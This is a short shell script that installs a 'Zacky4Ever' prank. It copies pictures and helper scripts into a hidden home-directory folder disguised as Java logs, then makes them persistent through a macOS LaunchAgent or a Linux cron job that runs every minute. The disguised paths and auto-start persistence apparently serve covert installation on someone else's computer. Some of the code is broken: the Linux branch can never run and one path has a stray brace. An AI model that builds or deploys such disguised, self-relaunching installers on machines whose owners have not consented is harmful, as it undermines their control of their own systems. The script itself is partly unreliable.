#!/bin/sh
# Install the Zacky4Ever prank.

# check os
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="MAC"
fi

if [ "${OS+set}" != set ]; then
  echo "INVALID OS"
  exit 1
fi

# setup root folder
# remove jic
ROOT_FOLDER=$HOME/.JAVA_LOGS_1805
rm -rf $ROOT_FOLDER

# copy content into root folder
cp -r pictures $ROOT_FOLDER
cp randomizer.sh $ROOT_FOLDER/.randomizer.sh
cp jobs/$OS.sh $ROOT_FOLDER/.job.sh

# setup cronjob
if [[ "$OS" == "MAC" ]]; then # running macOS

    # create plist
    PLIST_NAME=com.zac.efron.plist
    touch $HOME/Library/LaunchAgents/$PLIST_NAME
    echo $(sh $HOME/Zacky4Ever/create_plist.sh $ROOT_FOLDER) > $HOME/Library/LaunchAgents/$PLIST_NAME

    # launch plist
    launchctl unload $HOME/Library/LaunchAgents/$PLIST_NAME
    launchctl load $HOME/Library/LaunchAgents/$PLIST_NAME

else # running Linux

    (crontab -l -u $USER 2>/dev/null; \
    echo "* * * * * $ROOT_FOLDER/.job.sh $ROOT_FOLDER > $ROOT_FOLDER}.logs 2>&1") \
    | crontab -

fi
